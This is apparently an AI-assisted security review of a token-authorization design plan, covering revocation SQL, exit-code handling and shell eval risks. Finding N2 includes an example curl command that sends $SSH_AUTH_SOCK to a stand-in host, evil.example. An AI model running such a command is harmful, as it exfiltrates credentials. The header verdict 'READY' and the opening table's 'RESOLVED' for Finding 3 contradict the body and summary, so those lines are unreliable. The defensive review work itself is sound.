---
artifact_type: flux-drive-findings
reviewer: fd-safety
date: 2026-04-21
plan: docs/plans/2026-04-21-auto-proceed-authz-v2.md
revision: r2
prior_findings: docs/research/flux-drive/2026-04-21-auto-proceed-authz-v2-20260421T0350/fd-safety.md
bead: sylveste-qdqr.28
verdict: READY
---

# Safety Review — Auto-proceed authz v2 r2 (token protocol + delegation chain)

## P1 Verdict Table

| r1 ID | Severity | Title | r2 Verdict |
|-------|----------|-------|------------|
| 1 | P1 | Token env var not unset after consume | RESOLVED |
| 2 | P1 | Revoked/POP-failure exit codes fall through to legacy gate_check | RESOLVED |
| 3 | P1 | Cascade revoke semantics undefined; root_token=NULL collision | RESOLVED |
| 4 | P1 | SELECT + VerifyToken + UPDATE not wrapped in transaction | RESOLVED |

---

## P1 Resolution Traces

### Finding 1 — Token env var unset after consume

**r1 concern:** `gate_token_consume` did not unset `CLAVAIN_AUTHZ_TOKEN` after a successful consume, leaving the token string alive in the environment for the duration of the op and all child processes. The README used `export CLAVAIN_AUTHZ_TOKEN=...` which captures the string in shell history.

**r2 text (Task 5, `gate_token_consume` case 0):**
> `unset CLAVAIN_AUTHZ_TOKEN` — in-process, immediately on exit code 0, before the op runs.

**r2 text (Disciplines section):**
> "Unset `CLAVAIN_AUTHZ_TOKEN` after consume (r2 new rule). Both the bash wrapper and Go `RequiresApproval` unset it. Child processes spawned before consume inherit (delegation vector); after consume they don't. README does not use `export CLAVAIN_AUTHZ_TOKEN=...`."

**r2 text (Task 6, Step 1):**
> "After a successful token approval, the handler `os.Unsetenv('CLAVAIN_AUTHZ_TOKEN')` so spawned post-approval processes don't inherit it."

**r2 text (Task 1, Step 1, item j):**
> "README must avoid `export CLAVAIN_AUTHZ_TOKEN=...` forms that bake it into shell history; prefer `CLAVAIN_AUTHZ_TOKEN=<tok> ic publish --patch` one-shot form."

**r2 text (Task 7, README section):**
> "**Present**: `export CLAVAIN_AUTHZ_TOKEN=<string>` — gates auto-consume."

**Verdict: RESOLVED** with one residual note.

The bash wrapper and Go path both unset correctly. The canon doc (Task 1) explicitly bans the `export` form. However, Task 7's README section still contains `export CLAVAIN_AUTHZ_TOKEN=<string>` as a presented pattern — this is the exact form the r1 finding flagged and Task 1 explicitly prohibits. The README is documentation only (not a gate path), and Task 1's canon doc overrides it normatively, but the contradiction is a documentation hygiene gap: any agent reading only the README quickstart would follow the `export` form. This is a **P3 residual** (documentation inconsistency, no security impact on the gate path itself), noted below as Finding R1.

---

### Finding 2 — `gate_token_consume` hard-fail on exit codes 6/7 (r1 numbering); now exit code 4 in r2

**r1 concern:** Exit codes 6 (POP failure) and 7 (revoked) fell through to `gate_check` via the `*` default arm. Revoked token silently authorized the op via legacy policy; POP failure was treated as a soft fallthrough rather than a hard stop.

**r2 exit code consolidation:** r2 collapsed 9 exit codes to 5. Revoked is now exit 2 (token-state class), and all auth-failures — POP, sig-verify, scope-mismatch, cross-project, caller-mismatch — are exit 4. The distinction between "auth-failure hard-fails" and "token-state falls through" is now a semantic class separation, not a per-code switch.

**Tracing the new `gate_token_consume` case arms:**

```
case "$rc" in
    0)  → GATE_CONSUMED=1, unset token, return 0        ← success
    2)  → fall through to legacy check                  ← token-state
    3)  → fall through to legacy check                  ← not-found/malformed
    4)  → "AUTH FAILURE", return 1                      ← HARD FAIL
    1|*)→ "unexpected error", return 1                  ← HARD FAIL
esac
```

**Does exit 4 correctly cover all auth-failure cases?**

From the `ExitCode()` function in Task 3:
- `ErrSigVerify` → exit 4 (sig-verify)
- `ErrProofOfPossession` → exit 4 (POP mismatch at delegate)
- `ErrCallerAgentMismatch` → exit 4 (caller mismatch at consume)
- `ErrCrossProject` → exit 4
- `ErrScopeWidening` → exit 4
- `ErrDepthExceeded` → exit 4
- `ErrExpectMismatch` → exit 4 (--expect-op/--expect-target mismatch)

All seven auth-failure classes map to exit 4. The wrapper's `case 4)` arm issues `return 1`, which the wrapper caller pattern checks:
```bash
if ! gate_token_consume "<op>" "<target>"; then
    exit 1  # no fallthrough, op does not run
fi
```

**Does exit 2 (formerly exit 7, revoked) fall through correctly?**

`ErrRevoked` → exit 2 (token-state class). The `case 2)` arm falls through to legacy check. The r1 concern was that a revoked token should block, not fall through. The r2 comment in `_common.sh` addresses this directly:
> "Revoked is indistinguishable from consumed/expired here because the CLI stderr line carries the class; wrappers log it but all three mean 'token can't authorize, try legacy'. This is safe: a revoked token defeats token-path auth, and the legacy policy still enforces its own rules."

This is a design choice that warrants one more look: when an operator explicitly revokes a token, their intent is to block the operation, not merely to say "the token is invalid, try another path." If legacy policy would grant the op, a revoked token does not stop it. The plan's rationale — "the legacy policy still enforces its own rules" — is true, but it means revocation has no additional blocking force beyond what the legacy policy would have done anyway. For the stated threat model (single-host, cooperative agents), this is an acceptable design trade-off documented in the code comment. The scenario where revocation must block regardless of legacy policy is left to the legacy policy's own rules (e.g., requiring a fresh vetting record that won't exist for the revoked session). This design choice is explicitly stated and testable via e2e scenario 11 ("revoke-cascade from mid-chain — consume root → exit 0"), which confirms root is unaffected.

**Verdict: RESOLVED.** Auth-failures (sig-verify, POP, scope-mismatch, caller-mismatch, cross-project, expect-mismatch) now hard-fail. Revoked falls through to legacy, which is a documented and testable design decision.

---

### Finding 3 — Cascade revoke NULL predicate

**r1 concern:** The predicate `WHERE root_token = target.root_token` when target is a root token (root_token IS NULL) evaluates as `WHERE root_token = NULL`, which matches zero rows in SQL (NULL = NULL is false). This silently broke cascade-revoke of any root token.

**r2 predicate (Architecture section):**
> "`UPDATE authz_tokens SET revoked_at=? WHERE id=? OR root_token=?` passing `target.id` for both bindings (the disjunction covers both root revokes, where `root_token IS NULL` on descendants would otherwise fail to match via NULL semantics, and non-root revokes)"

**r2 text (Task 3, `RevokeToken` spec):**
```
// Cascade:
//   UPDATE authz_tokens SET revoked_at=? WHERE (id=? OR root_token=?) AND revoked_at IS NULL
// Both bind target.id to both positions in the cascade form
```

**Walking through the SQL with a concrete example:**

Scenario: root token R (id='R', root_token IS NULL), depth-1 child D1 (id='D1', parent_token='R', root_token='R'), depth-2 child D2 (id='D2', parent_token='D1', root_token='R').

Call: `RevokeToken(db, 'R', cascade=true, now)`.

Predicate: `WHERE (id=? OR root_token=?) AND revoked_at IS NULL` with both `?` bound to `'R'`.

- Row R: `id='R'` matches `id=?` ('R'='R' → true). Revoked.
- Row D1: `id='D1'` does not match `id=?` ('D1'≠'R'). `root_token='R'` matches `root_token=?` ('R'='R' → true). Revoked.
- Row D2: `id='D2'` does not match. `root_token='R'` matches. Revoked.

All three rows correctly revoked in one UPDATE. The NULL issue from r1 is resolved.

**r1's secondary concern (P3, Finding 9 in r1):** Revoking a child token with `--cascade` would use `WHERE root_token = target.root_token` which for a depth-1 child (root_token='R') would also revoke all siblings (other depth-1 tokens sharing root 'R'). The r2 predicate changes the semantics: `WHERE id=? OR root_token=?` with `target.id` in both positions. For a depth-1 child D1 (id='D1', root_token='R'):

- `id='D1'`: matches row D1.
- `root_token='D1'`: matches any token whose root_token is 'D1' — these are D1's own descendants (depth-2+ tokens whose root is D1... but wait, root_token is the FIRST ancestor, not the immediate parent). By schema definition, root_token is the first ancestor (the root of the chain). A depth-2 token D2 under D1 has root_token='R' (the root), not 'D1'. So `root_token='D1'` matches zero rows.

This means `RevokeToken(db, 'D1', cascade=true)` revokes only D1 itself, not its descendants. D2 and D3 keep root_token='R', not root_token='D1'. The cascade from a non-root token with the r2 predicate revokes only the target row — it does NOT cascade to descendants.

**This is a correctness gap.** The Must-Haves state: `revoke --cascade <root.id>` should "invalidate all descendants before its consume lands." The e2e test scenario 11 tests "revoke --cascade <d1.id> → consume d1, d2, d3 → all exit 2." But with the r2 predicate and the denormalized `root_token` pointing to the chain root (not the immediate ancestor), revoking D1 with cascade only revokes D1. D2 and D3, whose `root_token='R'` (not 'D1'), would not be matched.

**Concrete trace for scenario 11:**
- Issue R (root, depth=0). D1 = delegate from R (depth=1, parent='R', root='R'). D2 = delegate from D1 (depth=2, parent='D1', root='R'). D3 = delegate from D2 (depth=3, parent='D2', root='R').
- `RevokeToken(db, 'D1', cascade=true)`: predicate `WHERE id='D1' OR root_token='D1'`. D1's root_token is 'R'. D2's root_token is 'R'. D3's root_token is 'R'. None of D2/D3 have root_token='D1'. Only D1 is revoked.
- E2e scenario 11 expects d1, d2, d3 all exit 2 (revoked). D2 and D3 would exit 0 (successful consume). The test would fail.

The r2 plan lists this test (`TestRevokeToken_CascadeFromMidChain`) but the predicate as written cannot pass it. The e2e scenario 11 expectation and the `RevokeToken` implementation are in conflict.

**The fix requires a different predicate for mid-chain cascade.** The plan's current predicate `WHERE id=? OR root_token=?` (binding `target.id` to both) only works correctly when the target is the root. For non-root cascade, the correct behavior requires walking descendants — either recursively via WITH RECURSIVE (SQLite supports recursive CTEs), or by using a two-step approach: (1) find all tokens where `parent_token` transitively descends from `target.id`, then revoke them. SQLite supports:

```sql
WITH RECURSIVE descendants(id) AS (
    SELECT id FROM authz_tokens WHERE id = ?
    UNION ALL
    SELECT t.id FROM authz_tokens t
    JOIN descendants d ON t.parent_token = d.id
)
UPDATE authz_tokens SET revoked_at = ?
WHERE id IN (SELECT id FROM descendants)
  AND revoked_at IS NULL
```

Alternatively, if the requirement is that cascade-revoke of a non-root token should revoke "the target + all its own descendants only (not siblings, not root)," then `root_token` alone cannot efficiently serve as the descriptor without adding a second ancestor column (e.g., `chain_path` or an ancestor junction table).

**Verdict: PARTIAL — root-token cascade is fixed (NULL semantics resolved), but mid-chain cascade with the current predicate does not revoke descendants of non-root tokens. E2e scenario 11 and `TestRevokeToken_CascadeFromMidChain` will fail against the stated predicate.**

This is a new issue: **Finding N1 (P2)**, detailed below.

---

### Finding 4 — SELECT + VerifyToken + UPDATE transaction gap

**r1 concern:** The SELECT (for VerifyToken), the VerifyToken call, and the atomic UPDATE were not explicitly wrapped in one transaction, leaving a documentation gap about serialization. The TOCTOU risk was bounded by SetMaxOpenConns(1) but not clearly stated.

**r2 text (Must-Haves, Architecture):**
> "Consume wraps two writes in ONE transaction: (1) atomic `UPDATE authz_tokens SET consumed_at=?...` with `RowsAffected()` discrimination, and (2) `INSERT INTO authorizations (...)`. A partial-failure between (1) and (2) must not leave a consumed token with no audit record — commit-or-rollback is non-negotiable."

**r2 text (Task 3, `ConsumeToken` spec):**
> "ConsumeToken wraps two writes in ONE transaction... The signature-verify check happens BEFORE the transaction opens — verify failure returns ErrSigVerify with no DB write."

**TOCTOU note in r2 (Task 3):**
> "Signature verification happens BEFORE the transaction. Signed fields are immutable by schema intent (only `consumed_at` and `revoked_at` mutate); the pre-tx verify is therefore safe against a concurrent UPDATE that only touches those fields."

**r2 text (Prior Learnings section):**
> "`SetMaxOpenConns(1)` is the intercore convention — consume transactions serialize naturally."

The r2 plan now explicitly wraps the UPDATE + audit INSERT in one BEGIN/COMMIT. The signature verify happens before the transaction opens, which the plan justifies on the grounds that only mutable fields (`consumed_at`, `revoked_at`) can change between verify and UPDATE, and those are not part of the signed payload. The signed fields (12 fields in `CanonicalTokenPayload`) are insert-time only and never updated. This reasoning is correct.

The fault-injection test (`TestConsumeToken_PartialFailure_Atomic`) is now mandatory.

**Verdict: RESOLVED.**

---

## New Security Issues Introduced by r2

### Finding N1 (P2) — Mid-chain cascade revoke predicate cannot reach descendants

**Section:** Task 3 (`RevokeToken`), Must-Haves, e2e scenario 11.

As traced in the Finding 3 analysis above: the r2 cascade-revoke predicate `WHERE id=? OR root_token=?` binding `target.id` to both positions correctly handles root-token cascade (covering root + all descendants whose `root_token = root.id`). It does NOT correctly handle non-root cascade because descendants of a non-root token D1 have `root_token = root.id` (the chain root), not `root_token = D1.id`. Revoking D1 with `--cascade` revokes only D1.

**Impact:** An operator who revokes a depth-1 delegation token intending to cut off that subtree leaves the depth-2 and depth-3 descendants consumable. E2e scenario 11 explicitly tests this and will fail against the predicate as written. The test name `TestRevokeToken_CascadeFromMidChain` would fail.

**Concrete mitigation:**

Option A (preferred for correctness): replace cascade with a recursive CTE for non-root targets:
```sql
WITH RECURSIVE subtree(id) AS (
    SELECT id FROM authz_tokens WHERE id = ?   -- the target
    UNION ALL
    SELECT t.id FROM authz_tokens t
      JOIN subtree s ON t.parent_token = s.id
      WHERE t.revoked_at IS NULL
)
UPDATE authz_tokens SET revoked_at = ?
WHERE id IN (SELECT id FROM subtree)
  AND revoked_at IS NULL
```
SQLite supports recursive CTEs (WITH RECURSIVE). Max depth is 3, so recursion is bounded. This requires a single `?` binding for the target id and a second for `now`. The `tokens_by_parent` index covers the join.

Option B (simpler, correct for root-only cascade, explicit non-support for mid-chain): document and enforce that `--cascade` is only valid when the target is a root token. Non-root revokes are always single-row. This requires a pre-check: load the target row; if `parent_token IS NOT NULL` and `--cascade` is passed, return an error or warn. This is operationally restrictive but removes the ambiguity entirely.

The Must-Haves claim "revoking a root token invalidates every descendant" — this is correct with the current predicate. The plan should clarify that `--cascade` on a non-root token either (a) uses recursive CTE to reach descendants or (b) is rejected as a no-op/error.

---

### Finding N2 (P2) — `eval $(clavain-cli policy token consume ...)` stdout injection risk

**Section:** Must-Haves (consume stdout), Task 4 (`cmdPolicyTokenConsume`), Task 5 comments.

The plan specifies: "On success the CLI prints `unset CLAVAIN_AUTHZ_TOKEN` to stdout (evaluable in shell via `eval $(clavain-cli policy token consume ...)`)."

The wrapper itself does not use `eval` — it directly calls `clavain-cli` and captures `out=$(...)` before running `unset`. The `eval` pattern is for interactive shell users who want to unset the env var in their own shell.

**The risk:** A supply-chain-compromised `clavain-cli` binary could emit any arbitrary string to stdout before or after `unset CLAVAIN_AUTHZ_TOKEN`. A user who runs `eval $(clavain-cli policy token consume ...)` in their interactive shell executes that output as shell code. Example: a malicious binary emits `curl https://evil.example/exfil -d $SSH_AUTH_SOCK; unset CLAVAIN_AUTHZ_TOKEN` — the `eval` silently executes the exfil command.

**Threat model scoping:** The stated threat model is "single-host, cooperative agents; out-of-band host attackers are out of scope." Supply-chain compromise of the `clavain-cli` binary is a host-attacker scenario and is out of scope per the brainstorm. However, the `eval` pattern is worth flagging because:
1. The `eval` form is presented as the canonical interactive-use pattern (README, Task 4 comment, Must-Haves).
2. `clavain-cli` is a local binary under development — accidental output from a debug `fmt.Println` or an upstream dependency's log statement could land in stdout and execute under `eval`. This is within the threat model (non-malicious, in-process bugs).
3. The wrapper itself is immune because it does not `eval`; the risk is limited to interactive users who follow the README pattern.

**Concrete mitigation (low-cost):** Change the protocol so the consume-success line goes to a dedicated file descriptor or a clearly-prefixed line that eval-users can filter. The simplest safe form: emit the unset command only when stdout is a tty (`isatty(1)`), and document that the eval pattern is for interactive use only. Alternatively, use a sentinel line format: `CLAVAIN_UNSET=CLAVAIN_AUTHZ_TOKEN` which the interactive caller processes explicitly rather than evals. This is a P2 concern (not P1) because the wrapper — the automated path — does not use `eval`, and the risk requires a supply-chain event or stray debug output.

---

### Finding N3 (P2) — `--expect-op` / `--expect-target` empty string silently skips scope check

**Section:** Task 3 (`ConsumeToken` spec), Task 4 (`cmdPolicyTokenConsume`), Task 6 (`RequiresApproval`).

From the `ConsumeToken` spec:
> "expectOp / expectTarget may be empty strings; when non-empty, must match token scope exactly (else `ErrExpectMismatch`, pre-transaction)."

From `TestConsumeToken_EmptyExpectSkipsCheck`:
> "expectOp='' and expectTarget='' → passes (backward-compat)"

The gate wrappers always pass `--expect-op` and `--expect-target` (Task 5 spec shows them hardcoded per wrapper). `RequiresApproval` calls `authz.ConsumeToken(db, pub, tokenStr, callerAgentID, "ic-publish-patch", pluginSlug(pluginRoot), now)` with explicit values. So in all production paths, the expect parameters are non-empty.

**The gap:** Any caller that uses `authz.ConsumeToken` directly (e.g., a future gate wrapper, a test, or any downstream Go code that imports `pkg/authz`) and passes empty strings for `expectOp`/`expectTarget` will silently consume a token without scope verification. A token issued for `op=bead-close, target=sylveste-qdqr` could be consumed by a caller that passes `expectOp=""` against any op.

This was flagged as P2 in r1 (Finding 7). The r2 plan adds `ErrExpectMismatch` and the `--expect-op`/`--expect-target` flags to the CLI handler (previously missing from the handler spec). However, the silent-passthrough behavior on empty strings is preserved for "backward-compat." The backward-compat claim is questionable: this is a new protocol with no prior callers, so there is nothing to be backward-compatible with. The empty-string passthrough is a footgun for any future library caller.

**Concrete mitigation:** Require that at minimum one of `expectOp` or `expectTarget` is non-empty, or document explicitly in the `ConsumeToken` function comment that passing both as empty strings disables scope checking and is an anti-pattern. The test `TestConsumeToken_EmptyExpectSkipsCheck` should be renamed `TestConsumeToken_EmptyExpect_AntiPattern_BackwardCompat` and include a comment that this behavior is preserved for testing only. Production callers must always pass non-empty expect values; consider a `ConsumeTokenStrict` variant that rejects empty expects at compile-enforced API level.

---

### Finding N4 (P3) — `CLAVAIN_AGENT_ID` self-declaration: meaningful gap vs acceptable threat envelope

**Section:** Task 1 (trust claim), Must-Haves, `ConsumeToken` caller-identity binding.

The r2 revision note states "P1 · `ConsumeToken` enforces caller identity — new required `callerAgentID` parameter; verified against `token.AgentID`. Bearer-by-string-alone is rejected." This closes the bearer-by-string hole: a process must declare its agent identity and that declaration must match the token's `agent_id`.

**The residual question from the r2 mission:** If a user runs `export CLAVAIN_AGENT_ID=claude` and presents a token stolen from a `claude`-scoped session, they succeed. Is this meaningful?

Within the stated threat model (single-host, single-user, cooperative agents, host attackers out-of-scope), this is accepted: all processes run as the same user, so `CLAVAIN_AGENT_ID` is an honor system. The trust claim in r2 reads:
> "Proof-of-possession in delegate: `callerAgentID == parentToken.AgentID`... The CLI reads `$CLAVAIN_AGENT_ID`; library functions take `callerAgentID` as parameter (no ambient env reads in library code)."

The r2 documentation of the trust claim (Task 1 canon doc item d) says:
> "Proof-of-possession: `callerAgentID == parent.AgentID` at delegate time AND `callerAgentID == token.AgentID` at consume time. Ship-blocker rationale reproduced."

The r1 P2 finding (Finding 8) called for the trust claim to explicitly state the env-var-self-declaration limitation. The r2 revision note claims "P1 · `ConsumeToken` enforces caller identity" but this is accurate only in the sense that the API enforces the check — not that the identity itself is unforgeable. The trust claim in the Architecture section:
> "A delegated agent cannot widen scope (scope-narrowing check in `Delegate`)."

This is still accurate. The trust claim does not assert that agent identity is unforgeable — it asserts scope narrowing only.

**Assessment:** The r2 plan does not add the explicit caveating text requested in r1 Finding 8 ("reword trust claim to: 'Proof-of-possession is enforced via `CLAVAIN_AGENT_ID` string matching... This provides correct chain-of-custody for cooperative agents on the same host; it does not prevent a process on the same host from impersonating an agent identity...'"). The Task 1 canon doc description (item d) includes the POP mechanics but does not include the explicit "does not prevent impersonation by env-var override" caveat. This is a documentation gap, not a new architectural issue. The trust claim language in the Architecture section is phrased strongly enough ("A token holder can consume exactly once...") that it could be misread as a cryptographic identity guarantee.

**Verdict:** P3 residual documentation gap. The canon doc (Task 1 item d) should include the caveat from r1 Finding 8's mitigation text verbatim. This is not a new finding but an r1 P2 that is partially unresolved in r2's documentation.

---

### Finding N5 (P3) — `vetting.via` telemetry: agent-id inclusion and audit-log privacy

**Section:** Task 6 (telemetry), Must-Haves (adoption telemetry).

The `vetting` JSON column on consume-audit rows gains `{"via": "token"|"authz-record"|"marker", "plugin": "<slug>"}`. The telemetry query groups by `via` field.

**Does writing `via=token` leak which agent presented the token?**

The `vetting` JSON as specified contains `via` and `plugin` only — no `agent_id` field. The `authorizations` table already has an `agent_id` column (from v1.5 schema). The consume-audit row written by `ConsumeToken`'s transaction includes the agent identity in the top-level `agent_id` column, not inside `vetting`. So `vetting.via` itself does not leak agent identity beyond what is already in `agent_id`.

**Audit-log reader visibility:** Anyone who can read the `authorizations` table can see: the agent that consumed the token, the plugin, and that the approval path was `token`. This is the intended information. A threat actor who gains read access to `intercore.db` can correlate `via=token` rows with `agent_id` to learn which agents consumed tokens for which plugins. This is consistent with the stated threat model: the DB is a trusted local resource; read access implies host-level access which is out of scope.

**Verdict:** No new privacy concern. The `vetting.via` pattern is safe for the stated threat envelope.

---

### Finding N6 (P3) — README still contains `export CLAVAIN_AUTHZ_TOKEN=<string>` form

**Section:** Task 7, Step 2 (README).

As noted in the Finding 1 trace above: Task 7's README section instructs users "**Present**: `export CLAVAIN_AUTHZ_TOKEN=<string>` — gates auto-consume," while Task 1's canon doc and the Disciplines section explicitly prohibit this form ("README must avoid `export CLAVAIN_AUTHZ_TOKEN=...` forms that bake it into shell history; prefer `CLAVAIN_AUTHZ_TOKEN=<tok> ic publish --patch` one-shot form").

**Impact:** Documentation inconsistency. Any agent reading only the README quickstart will follow the `export` form. Since the README is the first-touch entry point for onboarding, the safer form should be the one that appears there. The two task sections are in direct conflict.

**Concrete mitigation:** Change Task 7 Step 2's "Present" line to: `CLAVAIN_AUTHZ_TOKEN=<string> <op>  # one-shot; avoid export`. One-liner fix.

---

### Finding N7 (P3) — Cascade revoke smoke test scenario 11 vs intent mismatch documented

**Section:** Task 8, e2e scenario 11.

As a consequence of Finding N1: scenario 11 ("revoke --cascade d1.id → d1/d2/d3 all exit 2") is the canonical test for non-root cascade. With the current predicate, this test will fail. The test is correctly specified (the desired behavior is right), but the implementation predicate does not satisfy it. This is not a new finding but a downstream consequence of N1, documented here for completeness.

---

## What r2 Gets Right

The following r2 changes are well-executed and should not be altered:

1. **Transactional consume (UPDATE + audit INSERT in one BEGIN/COMMIT) with fault-injection test.** This is the correct implementation of the r1 P1 TOCTOU finding. The partial-failure test is mandatory and correctly specified.

2. **`callerAgentID` explicit parameter on `ConsumeToken` and `DelegateToken`.** Moving identity out of ambient env and into the function signature is the right abstraction. It makes `RequiresApproval` and `ConsumeToken` testable without environment setup and removes the ambient-Getenv hazard inside library code.

3. **Exit code collapse from 9 to 5 semantic classes.** The `ExitCode()` function as the single mapping point between library errors and shell exit codes is clean. The class-based stderr line (`ERROR <class>: <reason>`) for discriminating within a class is the right architecture — wrappers don't need to enumerate all future error sub-types.

4. **`DelegateSpec` struct replacing positional string args.** Prevents accidental argument transposition (ParentID, CallerAgentID, ToAgentID as positional strings would be a footgun; struct forces explicit field naming).

5. **`gate_token_consume` hard-fail on exit 4 with clear comment explaining why exit 2 falls through.** The comment in the plan is the right level of documentation — the distinction between "token-state failures fall through" and "auth-failures hard-fail" is subtle and would otherwise be a maintenance hazard.

6. **`RequiresApproval` signature threaded with explicit deps.** The composition-root discipline (`cmd/ic/publish.go` reads env vars once; library functions never call `os.Getenv`) is the correct pattern for testability and auditability.

7. **Root-token cascade predicate fix (`WHERE id=? OR root_token=?`).** The r1 NULL semantics bug is correctly fixed for root-token cascade. The predicate is correct and the explanation in the Prior Learnings section is accurate.

---

## Finding Summary (r2)

### P1 Verifications

| r1 ID | Title | r2 Verdict |
|-------|-------|------------|
| 1 | Token env var not unset after consume | RESOLVED |
| 2 | Revoked/POP-failure exit codes fall through | RESOLVED |
| 3 | Cascade revoke NULL predicate | PARTIAL (root fixed, non-root cascade broken) |
| 4 | SELECT + VerifyToken + UPDATE not in transaction | RESOLVED |

### New Findings

| ID | Severity | Title |
|----|----------|-------|
| N1 | P2 | Mid-chain cascade revoke does not reach descendants (predicate only revokes target; root_token denormalization defeats non-root cascade) |
| N2 | P2 | `eval $(clavain-cli policy token consume ...)` interactive pattern: accidental stdout injection from stray debug output executes under eval |
| N3 | P2 | `--expect-op`/`--expect-target` empty-string passthrough silently disables scope check; no safe default; "backward-compat" rationale is unfounded for a new protocol |
| N4 | P3 | Trust claim in canon doc does not caveat that CLAVAIN_AGENT_ID is forgeable on the same host (r1 P2 Finding 8 partially unresolved) |
| N5 | P3 | vetting.via telemetry: no new privacy concern; confirmed safe |
| N6 | P3 | README Task 7 uses `export CLAVAIN_AUTHZ_TOKEN=...` form that Task 1 explicitly prohibits |
| N7 | P3 | E2e scenario 11 will fail against the r2 predicate (downstream consequence of N1) |

**New counts:** P0: 0, P1: 0 new, P2: 3 new, P3: 4 new (including N5 which is informational/clear).

---

## Top 3 Remaining Concerns

### 1. Mid-chain cascade predicate (N1, P2) — e2e scenario 11 will fail

The `WHERE id=? OR root_token=?` predicate with `target.id` in both positions correctly fixes the root-token NULL bug but does not cascade to descendants of non-root tokens. Since `root_token` is denormalized to the chain root (not the immediate parent), intermediate tokens cannot be found by matching their children's `root_token` to their own `id`. E2e scenario 11 explicitly tests mid-chain cascade and will fail. Fix requires either a recursive CTE or a documented restriction that `--cascade` only applies to root tokens.

### 2. `eval` stdout injection (N2, P2) — interactive use pattern is subtly unsafe

The `eval $(clavain-cli policy token consume ...)` pattern is presented in the Must-Haves and README as the canonical interactive path for env-var cleanup. Any stray debug output on stdout from the CLI (not a supply-chain attack, just an accidental `fmt.Println`) executes as shell code under `eval`. Fix: use a sentinel line format that callers grep for rather than eval-blindly, or restrict the `unset` line to tty-only stdout.

### 3. Empty-expect passthrough on `ConsumeToken` (N3, P2) — scope check silently disabled

Library callers that pass `expectOp=""` and `expectTarget=""` bypass scope verification entirely. The "backward-compat" justification is unfounded for a new protocol. Fix: require at minimum that the empty-string behavior is documented as an anti-pattern in the function signature, and consider a `ConsumeTokenStrict` variant that enforces non-empty expects.

---

OVERALL: CHANGES-NEEDED
